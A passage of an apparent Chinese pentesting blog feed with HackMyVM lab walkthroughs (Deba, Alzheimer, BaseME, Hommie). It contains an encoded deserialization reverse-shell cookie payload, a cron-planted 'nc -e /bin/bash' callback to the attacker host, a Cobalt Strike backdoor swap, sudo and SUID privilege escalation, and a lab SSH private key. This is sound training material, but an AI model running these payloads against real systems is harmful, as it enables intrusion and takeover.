zMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMTgsOTcsMTE0LDMyLDExNSwxMDQsMzIsNjEsMzIsMTE1LDExMiw5NywxMTksMTEwLDQwLDM5LDQ3LDk4LDEwNSwxMTAsNDcsMTE1LDEwNCwzOSw0NCw5MSw5Myw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQ2LDExOSwxMTQsMTA1LDExNiwxMDEsNDAsMzQsNjcsMTExLDExMCwxMTAsMTAxLDk5LDExNiwxMDEsMTAwLDMzLDkyLDExMCwzNCw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQ2LDExMiwxMDUsMTEyLDEwMSw0MCwxMTUsMTA0LDQ2LDExNSwxMTYsMTAwLDEwNSwxMTAsNDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTE1LDEwNCw0NiwxMTUsMTE2LDEwMCwxMTEsMTE3LDExNiw0NiwxMTIsMTA1LDExMiwxMDEsNDAsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMTUsMTA0LDQ2LDExNSwxMTYsMTAwLDEwMSwxMTQsMTE0LDQ2LDExMiwxMDUsMTEyLDEwMSw0MCw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDExNSwxMDQsNDYsMTExLDExMCw0MCwzOSwxMDEsMTIwLDEwNSwxMTYsMzksNDQsMTAyLDExNywxMTAsOTksMTE2LDEwNSwxMTEsMTEwLDQwLDk5LDExMSwxMDAsMTAxLDQ0LDExNSwxMDUsMTAzLDExMCw5NywxMDgsNDEsMTIzLDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDYsMTAxLDExMCwxMDAsNDAsMzQsNjgsMTA1LDExNSw5OSwxMTEsMTEwLDExMCwxMDEsOTksMTE2LDEwMSwxMDAsMzMsOTIsMTEwLDM0LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDEyNSw0MSw1OSwxMCwzMiwzMiwzMiwzMiwxMjUsNDEsNTksMTAsMzIsMzIsMzIsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0NiwxMTEsMTEwLDQwLDM5LDEwMSwxMTQsMTE0LDExMSwxMTQsMzksNDQsMzIsMTAyLDExNywxMTAsOTksMTE2LDEwNSwxMTEsMTEwLDQwLDEwMSw0MSwzMiwxMjMsMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTE1LDEwMSwxMTYsODQsMTA1LDEwOSwxMDEsMTExLDExNywxMTYsNDAsOTksNDAsNzIsNzksODMsODQsNDQsODAsNzksODIsODQsNDEsNDQsMzIsODQsNzMsNzcsNjksNzksODUsODQsNDEsNTksMTAsMzIsMzIsMzIsMzIsMTI1LDQxLDU5LDEwLDEyNSwxMCw5OSw0MCw3Miw3OSw4Myw4NCw0NCw4MCw3OSw4Miw4NCw0MSw1OSwxMCkpIH0oKSJ9
<br>开启监听 并使用这个payload作为cookie然后访问<br>curl http://192.168.56.26:3000/ -b "profile=base64后的payload"
<br>┌──(root㉿kali)-[~/Desktop/hmv/deba]
└─# pwncat-cs -lp 1234

[03:51:04] Welcome to pwncat 🐈!                                                                  __main__.py:164
[03:51:09] received connection from 192.168.56.26:44754                                                bind.py:84
[03:51:09] 0.0.0.0:1234: normalizing shell path                                                    manager.py:957
           0.0.0.0:1234: upgrading from /usr/bin/dash to /usr/bin/bash                             manager.py:957
           192.168.56.26:44754: registered new host w/ db                                          manager.py:957
(local) pwncat$
(remote) www-data@debian:/var/www$ whoami
www-data

<br><br>(remote) www-data@debian:/home/low$ sudo -l
Matching Defaults entries for www-data on debian:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on debian:
    (ALL : low) NOPASSWD: /usr/bin/python3 /home/low/scripts/script.py

(remote) www-data@debian:/home/low/scripts$ ls -la
total 16
drwxr-xr-x 2 low      low      4096 may  7  2021 .
drwxr-xr-x 8 low      low      4096 may  7  2021 ..
-rwxr-xr-x 1 www-data www-data   88 may  7  2021 main.py
-rw-r--r-- 1 low      low        80 may  7  2021 script.py

(remote) www-data@debian:/home/low/scripts$ cat script.py
import main
import os

print("\n")
os.system("ip a | grep enp0s3")

print("\n")

<br>这里我们可以用 low 用户执行 script.py 而且 script.py 引入了 main.py 我们当前用户可以修改这个 main.py 文件<br>修改 mian.py<br>(remote) www-data@debian:/home/low/scripts$ vi main.py
(remote) www-data@debian:/home/low/scripts$ cat main.py
from os import system as main
print("\n")
print("Just main")
main("whoami")
main("/bin/bash")

<br>sudo提权<br>(remote) www-data@debian:/home/low/scripts$ sudo -u low python3 /home/low/scripts/script.py

low@debian:~/scripts$ whoami
low

low@debian:~$ cat user.txt
justdeserialize

<br><br>我们使用提权脚本进行检测发现可以利用的点<br>*/1 *   * * *   debian /usr/bin/python3 /home/debian/Documentos/backup/dissapeared.py ; echo "Done" &gt;&gt; /home/debian/Documentos/log
<br>debian 用户每分钟会执行一次 /home/debian/Documentos/backup/dissapeared.py<br>但是 backup/dissapeared.py 并不存在，我们自己写一个即可<br>low@debian:/home/debian/Documentos$  ls -la
total 12
drwxrwx---  2 debian low    4096 may  7  2021 .
drwxr-xr-x 15 debian debian 4096 may  8  2021 ..
-rw-r--r--  1 debian debian  600 dic 27 10:19 log
low@debian:/home/debian/Documentos$ mkdir backup
low@debian:/home/debian/Documentos$ vi dissapeared.py
low@debian:/home/debian/Documentos$ cat dissapeared.py
import os
os.system("nc -e /bin/bash 192.168.56.6 2233")

<br>等待反弹即可<br><br>(remote) debian@debian:/home/debian$ sudo -l
Matching Defaults entries for debian on debian:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User debian may run the following commands on debian:
    (ALL : root) NOPASSWD: /bin/wine /opt/Buffer-Overflow-Vulnerable-app/brainfuck.exe
    
(remote) debian@debian:/home/debian$ ls -l /opt/Buffer-Overflow-Vulnerable-app/brainfuck.exe
-rw-r--r-- 1 debian debian 21190 may  7  2021 /opt/Buffer-Overflow-Vulnerable-app/brainfuck.exe


<br>wine  简单来说就是允许我们在linux上允许window程序<br>
我们只要将 brainfuck.exe 替换成我们的后门程序即可<br><br>note这里我先用msf试着生成一个exe后门 ，但是没有成功，wine执行后会保存<br>
然后用CS生成exe后门可以运行且不会报错<br>msf后门报错<br>(remote) debian@debian:/home/debian$ sudo -u root /bin/wine /opt/Buffer-Overflow-Vulnerable-app/brainfuck.exe
0009:err:seh:setup_exception_record stack overflow 1200 bytes in thread 0009 eip 7bc46086 esp 00240e80 stack 0x240000-0x241000-0x340000


<br>上传CS生成的后门<br>
然后运行即可<br><img alt="Pasted image 20241227182208" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241227182208.png" referrerpolicy="no-referrer"><br>
但是由于是linux运行window的后门， 好像执行不了命令，反正我没有成功<br>
但是我们可以进行文件操作，这里可以直接读取root.txt<br>但我还是选择写公钥进去然后连接<br>
<img alt="Pasted image 20241227182738" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241227182738.png" referrerpolicy="no-referrer"><br>
成功拿下root<br>┌──(root㉿kali)-[/var/www/html]
└─# ssh -i /root/.ssh/id_rsa root@192.168.56.26
The authenticity of host '192.168.56.26 (192.168.56.26)' can't be established.
ED25519 key fingerprint is SHA256:FQI6CQCD3uUo59olao5SmG/3b/R9quOafr6mSSLvdlA.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.26' (ED25519) to the list of known hosts.
Linux debian 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
root@debian:~# whoami
root
root@debian:~# cat /root/root.txt
BoFsavetheworld

<br>最后，其实这里也可以用 pwnkit 漏洞进行内核提权]]></description><link>https://www.c1trus.top/24-渗透/hmv/48.deba.html</link><guid isPermaLink="false">24-渗透/HMV/48.deba.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Fri, 27 Dec 2024 11:09:05 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241227002954.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241227002954.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[9.Alzheimer]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
<br><a data-tooltip-position="top" aria-label="3. ftp匿名登录" data-href="#3. ftp匿名登录" href="https://www.c1trus.top/about:blank#3._ftp匿名登录" class="internal-link" target="_self" rel="noopener nofollow">3. ftp匿名登录</a>
<br><a data-tooltip-position="top" aria-label="4. 提权" data-href="#4. 提权" href="https://www.c1trus.top/about:blank#4._提权" class="internal-link" target="_self" rel="noopener nofollow">4. 提权</a>
<br>靶机链接：https://hackmyvm.eu/machines/machine.php?vm=Alzheimer
<br>作者：sml
<br>难度：死题
<br>知识点：knock命令、SUID提权（capsh）
<br><br>端口扫描<br>┌──(root㉿kali)-[/home/kali]
└─# nmap -sS 192.168.9.11 -p 1-65535
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-05 23:23 CST
Nmap scan report for 192.168.9.11
Host is up (0.00034s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE    SERVICE
21/tcp open     ftp
22/tcp filtered ssh
80/tcp filtered http
MAC Address: 08:00:27:93:BB:DC (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 9.18 seconds
<br>对80 22进行了限制<br><br>ftp 192.168.9.11
anonymous
<br>里面有一个.secretnote.txt 文件<br>查看<br>cat .secretnote.txt 
I need to knock this ports and 
one door will be open!
1000
2000
3000
Ihavebeenalwayshere!!!
<br>解密 <br>意思是我们需要访问这3000个端口 然后就会有一个服务打开<br>依次访问这些端口<br>knock 192.168.9.11 1000 2000 3000 -v
<br>然后重新扫描一下<br>┌──(root㉿kali)-[/home/kali]
└─# nmap -sS 192.168.9.11 -p 1-65535
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-05 23:30 CST
Nmap scan report for 192.168.9.11
Host is up (0.00023s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:93:BB:DC (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 8.12 seconds
<br>可以发现22 80都开放了<br>访问网站<br>啥都没有<br>直接扫目录<br>┌──(root㉿kali)-[/home/kali]
└─# gobuster dir -u http://192.168.9.11/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.9.11/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/home                 (Status: 301) [Size: 185] [--&gt; http://192.168.9.11/home/]
/admin                (Status: 301) [Size: 185] [--&gt; http://192.168.9.11/admin/]
/secret               (Status: 301) [Size: 185] [--&gt; http://192.168.9.11/secret/]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
<br>
敲了半天开不了门。目录访问不了。后面看wp发现是网卡问题
<br>这里直接给flag<br>root@alzheimer:~# cat /root/root.txt
HMVlovememories
root@alzheimer:~# cat /home/medusa/user.txt
HMVrespectmemories
root@alzheimer:~# 
<br>还是看下题目的考点吧。<br>敲门成功后访问网站根目录<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/9.Alzheimer.001.png" referrerpolicy="no-referrer"><br>下面应该是一个摩斯密码<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/9.Alzheimer.002.png" referrerpolicy="no-referrer"><br>OTHINGM
<br>这个应该就是medusa的密码了<br>但是是不对的<br>继续看网站的其他目录<br>admin目录是空的<br>home目录下的文件提示我们pass在Home目录，但不是这个home目录<br>secret目录提示我们密码在这个secret目录的某个目录下<br>那密码就是在/secret/home目录<br>/secret/home目录的文件给了个啥用没有的提示<br>根目录给我们说他将密码写入了一个.txt文件<br>到目前为止，唯一获取到的.txt文件就是.secretnote.txt<br>I need to knock this ports and 
one door will be open!
1000
2000
3000
Ihavebeenalwayshere!!!
<br>里面的Ihavebeenalwayshere!!! 就是medusa的密码<br><br>虽然flag有了，但还是看看提权部分吧<br>拿到用户medusa的权限后<br>medusa@alzheimer:/root$ find / -perm -4000  2&gt;/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/su
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/umount
/usr/bin/gpasswd
/usr/sbin/capsh
<br>capsh --gid=0 --uid=0 --
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/9.Alzheimer.003.png" referrerpolicy="no-referrer">]]></description><link>https://www.c1trus.top/24-渗透/hmv/9.alzheimer.html</link><guid isPermaLink="false">24-渗透/HMV/9.Alzheimer.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/9.Alzheimer.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/9.Alzheimer.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[8.BaseME]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
<br><a data-tooltip-position="top" aria-label="3. BASE64编码目录爆破" data-href="#3. BASE64编码目录爆破" href="https://www.c1trus.top/about:blank#3._BASE64编码目录爆破" class="internal-link" target="_self" rel="noopener nofollow">3. BASE64编码目录爆破</a>
<br><a data-tooltip-position="top" aria-label="4. 提权" data-href="#4. 提权" href="https://www.c1trus.top/about:blank#4._提权" class="internal-link" target="_self" rel="noopener nofollow">4. 提权</a>
<br>靶机链接：https://hackmyvm.eu/machines/machine.php?vm=BaseME
<br>作者：sml
<br>难度：⭐️⭐️
<br>知识点：base64编码扫描、linuxbase64编码自带换行符、
<br><br>端口扫描<br>──(root㉿kali)-[/home/kali]
└─# nmap -sS 192.168.9.10  -p 1-65535 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-05 21:25 CST
Nmap scan report for 192.168.9.10
Host is up (0.00038s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:7C:3B:62 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 8.23 seconds
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/8.BaseME.001.png" referrerpolicy="no-referrer"><br>上面是一串base64编码的字符串<br>解码得到<br>ALL, absolutely ALL that you need is in BASE64.
Including the password that you need :)
Remember, BASE64 has the answer to all your questions.
-lucas
<br>提示我们我们想要的都可以通过base64获取<br>尝试爆破目录发现没有结果。猜测可能是需要base64加密<br><br>直接对字典进行逐行base64加密<br>import base64

def encode\_file\_line\_by\_line(*input\_file*, *output\_file*):
    with open(*input\_file*, 'r', *encoding*='utf-8') as infile, open(*output\_file*, 'w', *encoding*='utf-8') as outfile:
        for line in infile:
            *# 直接对整行（包括换行符）进行 Base64 编码*
            encoded\_line = base64.b64encode(line.encode()).decode()
            *# 将编码后的内容写入输出文件，并添加换行符*
            outfile.write(encoded\_line + '\n')

*# 使用示例*
input\_file = 'dicc.txt'  *# 输入文件路径*
output\_file = 'base64\_dicc.txt'  *# 输出文件路径*
encode\_file\_line\_by\_line(input\_file, output\_file)
<br>然后爆破<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/8.BaseME.002.png" referrerpolicy="no-referrer"><br>/aWRfcnNhCg==
/cm9ib3RzLnR4dAo=
<br>获取了私钥<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/8.BaseME.002.png" referrerpolicy="no-referrer"><br>-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABBTxe8YUL
BtzfftAdPgp8YZAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQCZCXvEPnO1
cbhxqctBEcBDZjqrFfolwVKmpBgY07M3CK7pO10UgBsLyYwAzJEw4e6YgPNSyCDWFaNTKG
07jgcgrggre8ePCMNFBCAGaYHmLrFIsKDCLI4NE54t58IUHeXCZz72xTobL/ptLk26RBnh
7bHG1JjGlxOkO6m+1oFNLtNuD2QPl8sbZtEzX4S9nNZ/dpyRpMfmB73rN3yyIylevVDEyv
f7CZ7oRO46uDgFPy5VzkndCeJF2YtZBXf5gjc2fajMXvq+b8ol8RZZ6jHXAhiblBXwpAm4
vLYfxzI27BZFnoteBnbdzwSL5apBF5gYWJAHKj/J6MhDj1GKAFc1AAAD0N9UDTcUxwMt5X
YFIZK8ieBL0NOuwocdgbUuktC21SdnSy6ocW3imM+3mzWjPdoBK/Ho339uPmBWI5sbMrpK
xkZMnl+rcTbgz4swv8gNuKhUc7wTgtrNX+PNMdIALNpsxYLt/l56GK8R4J8fLIU5+MojRs
+1NrYs8J4rnO1qWNoJRZoDlAaYqBV95cXoAEkwUHVustfgxUtrYKp+YPFIgx8okMjJgnbi
NNW3TzxluNi5oUhalH2DJ2khKDGQUi9ROFcsEXeJXt3lgpZZt1hrQDA1o8jTXeS4+dW7nZ
zjf3p0M77b/NvcZE+oXYQ1g5Xp1QSOSbj+tlmw54L7Eqb1UhZgnQ7ZsKCoaY9SuAcqm3E0
IJh+I+Zv1egSMS/DOHIxO3psQkciLjkpa+GtwQMl1ZAJHQaB6q70JJcBCfVsykdY52LKDI
pxZYpLZmyDx8TTaA8JOmvGpfNZkMU4I0i5/ZT65SRFJ1NlBCNwcwtOl9k4PW5LVxNsGRCJ
MJr8k5Ac0CX03fXESpmsUUVS+/Dj/hntHw89dO8HcqqIUEpeEbfTWLvax0CiSh3KjSceJp
+8gUyDGvCkcyVneUQjmmrRswRhTNxxKRBZsekGwHpo8hDYbUEFZqzzLAQbBIAdrl1tt7mV
tVBrmpM6CwJdzYEl21FaK8jvdyCwPr5HUgtuxrSpLvndcnwPaxJWGi4P471DDZeRYDGcWh
i6bICrLQgeJlHaEUmrQC5Rdv03zwI9U8DXUZ/OHb40PL8MXqBtU/b6CEU9JuzJpBrKZ+k+
tSn7hr8hppT2tUSxDvC+USMmw/WDfakjfHpoNwh7Pt5i0cwwpkXFQxJPvR0bLxvXZn+3xw
N7bw45FhBZCsHCAbV2+hVsP0lyxCQOj7yGkBja87S1e0q6WZjjB4SprenHkO7tg5Q0HsuM
Aif/02HHzWG+CR/IGlFsNtq1vylt2x+Y/091vCkROBDawjHz/8ogy2Fzg8JYTeoLkHwDGQ
O+TowA10RATek6ZEIxh6SmtDG/V5zeWCuEmK4sRT3q1FSvpB1/H+FxsGCoPIg8FzciGCh2
TLuskcXiagns9N1RLOnlHhiZd8RZA0Zg7oZIaBvaZnhZYGycpAJpWKebjrtokLYuMfXRLl
3/SAeUl72EA3m1DInxsPguFuk00roMc77N6erY7tjOZLVYPoSiygDR1A7f3zYz+0iFI4rL
ND8ikgmQvF6hrwwJBrp/0xKEaMTCKLvyyZ3eDSdBDPrkThhFwrPpI6+Ex8RvcWI6bTJAWJ
LdmmRXUS/DtO+69/aidvxGAYob+1M=
-----END OPENSSH PRIVATE KEY-----
<br>ssh连上去<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/8.BaseME.003.png" referrerpolicy="no-referrer"><br>提示需要私钥密码<br>猜测就是开始下面那句话的Base64编码<br>iloveyou
youloveyou
shelovesyou
helovesyou
weloveyou
theyhatesme
<br>这里直接逐行Base64加密是不行的，后面要加上一个回车才是对的（因为他这里面的编码都是linux里面进行的。linux默认对字符串进行base64编码后面是带有换行符的）<br>第一个加密就是对的<br>iloveyou 》aWxvdmV5b3UK
<br>然后就能连接上来了<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/8.BaseME.004.png" referrerpolicy="no-referrer"><br><br>lucas@baseme:~$ find / -perm -4000 2&gt;/dev/null
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/mount
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/su
/usr/bin/chsh
/usr/bin/umount
/usr/bin/gpasswd
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
lucas@baseme:~$ sudo -l
Matching Defaults entries for lucas on baseme:
    env\_reset, mail\_badpass, secure\_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User lucas may run the following commands on baseme:
    (ALL) NOPASSWD: /usr/bin/base64
lucas@baseme:~$ 
<br>sudo base64 "/root/root.txt" |base64 --decode
<br>这里应该读取私钥然后连接<br>我这里直接偷懒读取flag了]]></description><link>https://www.c1trus.top/24-渗透/hmv/8.baseme.html</link><guid isPermaLink="false">24-渗透/HMV/8.BaseME.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/8.BaseME.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/8.BaseME.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[7.Hommie]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
<br><a data-tooltip-position="top" aria-label="2. 1.信息收集" data-href="#2. 1.信息收集" href="https://www.c1trus.top/about:blank#2._1.信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 1.信息收集</a>
<br><a data-tooltip-position="top" aria-label="3. 2.FTP匿名登录" data-href="#3. 2.FTP匿名登录" href="https://www.c1trus.top/about:blank#3._2.FTP匿名登录" class="internal-link" target="_self" rel="noopener nofollow">3. 2.FTP匿名登录</a>
<br><a data-tooltip-position="top" aria-label="4. 3.UDP扫描" data-href="#4. 3.UDP扫描" href="https://www.c1trus.top/about:blank#4._3.UDP扫描" class="internal-link" target="_self" rel="noopener nofollow">4. 3.UDP扫描</a>
<br><a data-tooltip-position="top" aria-label="5. 4.tftp连接" data-href="#5. 4.tftp连接" href="https://www.c1trus.top/about:blank#5._4.tftp连接" class="internal-link" target="_self" rel="noopener nofollow">5. 4.tftp连接</a>
<br><a data-tooltip-position="top" aria-label="6. 5.提权" data-href="#6. 5.提权" href="https://www.c1trus.top/about:blank#6._5.提权" class="internal-link" target="_self" rel="noopener nofollow">6. 5.提权</a>
<br>靶机链接：https://hackmyvm.eu/machines/machine.php?vm=Hommie
<br>作者：sml
<br>难度：⭐️⭐️
<br>知识点：TFTP服务、环境变量修改、
<br><br>┌──(root㉿kali)-[/home/kali]
└─# nmap 192.168.9.9 -p 1-65535     
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-05 17:09 CST
Nmap scan report for 192.168.9.9
Host is up (0.00053s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:91:0D:AD (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 8.47 seconds
<br>先看下网站<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/7.Hommie.001.png" referrerpolicy="no-referrer"><br>提示我们他的 私钥泄露了。那我估计就是用他的私钥去ssh靶机了<br>先扫一波网站目录<br>啥也没有<br><br>开放了ftp服务。可能存在ftp匿名登录 尝试连接一下<br>┌──(root㉿kali)-[/home/kali]
└─# ftp 192.168.9.9         
Connected to 192.168.9.9.
220 (vsFTPd 3.0.3)
Name (192.168.9.9:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; ls
229 Entering Extended Passive Mode (|||45506|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0               0 Sep 30  2020 index.html
226 Directory send OK.
ftp&gt; get index.html
local: index.html remote: index.html
229 Entering Extended Passive Mode (|||13697|)
150 Opening BINARY mode data connection for index.html (0 bytes).
     0        0.00 KiB/s 
226 Transfer complete.
ftp&gt; ls -a
229 Entering Extended Passive Mode (|||39331|)
150 Here comes the directory listing.
drwxr-xr-x    3 0        113          4096 Sep 30  2020 .
drwxr-xr-x    3 0        113          4096 Sep 30  2020 ..
drwxrwxr-x    2 0        113          4096 Sep 30  2020 .web
-rw-r--r--    1 0        0               0 Sep 30  2020 index.html
226 Directory send OK.
<br>根目录下有一个index.html 里面是空的<br>还有一个隐藏目录.web<br>里面是真正的index.html<br>ftp&gt; ls -a
229 Entering Extended Passive Mode (|||6919|)
150 Here comes the directory listing.
drwxrwxr-x    2 0        113          4096 Sep 30  2020 .
drwxr-xr-x    3 0        113          4096 Sep 30  2020 ..
-rw-r--r--    1 0        0              99 Sep 30  2020 index.html
226 Directory send OK.
ftp&gt; get index.html
local: index.html remote: index.html
229 Entering Extended Passive Mode (|||64608|)
150 Opening BINARY mode data connection for index.html (99 bytes).
100% |\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*|    99        1.81 MiB/s    00:00 ETA
226 Transfer complete.
99 bytes received in 00:00 (85.93 KiB/s)
<br>发现其内容就是这个网站首页的内容<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/7.Hommie.002.png" referrerpolicy="no-referrer"><br>那么大概率.web目录就是网站的根目录了。传一个马上去<br>上传后访问发现不能对php进行解析。可能是目录限制<br>我们新建一个目录，发现命令也收到了限制。那这里我们应该要换一条路了<br><br>对靶机进行udp扫描<br>──(root㉿kali)-[/home/kali]
└─# nmap -sU  192.168.9.9 -p 1-100 //限制端口 Udp扫的很慢
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-05 17:52 CST
Stats: 0:00:47 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 52.80% done; ETC: 17:54 (0:00:37 remaining)
Stats: 0:01:13 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 67.80% done; ETC: 17:54 (0:00:32 remaining)
Stats: 0:01:14 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 68.80% done; ETC: 17:54 (0:00:31 remaining)
Stats: 0:01:42 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 91.30% done; ETC: 17:54 (0:00:09 remaining)
Nmap scan report for 192.168.9.9
Host is up (0.00056s latency).
Not shown: 98 closed udp ports (port-unreach)
PORT   STATE         SERVICE
68/udp open|filtered dhcpc
69/udp open|filtered tftp
MAC Address: 08:00:27:91:0D:AD (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 124.69 seconds
<br><br>可以发现开启了tftp服务，TFTP 没有身份验证机制，且不加密传输<br>利用tftp连接服务器<br><br>tftp 192.168.9.9
get id\_rsa //猜测这里有私钥
<br>利用下载的私钥连接<br>chmod 600 id\_rsa
